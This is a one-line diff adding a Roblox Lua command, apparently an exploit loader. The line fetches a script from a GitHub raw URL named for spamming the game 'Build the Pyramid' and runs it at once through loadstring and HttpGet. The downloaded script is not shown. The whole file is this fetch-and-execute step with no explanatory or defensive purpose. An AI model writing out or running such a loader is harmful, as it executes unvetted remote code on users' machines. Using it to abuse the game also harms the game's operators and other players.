@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/build-the-pyramid-spam5-8xwmx1o3ey9ozd.lua"))()
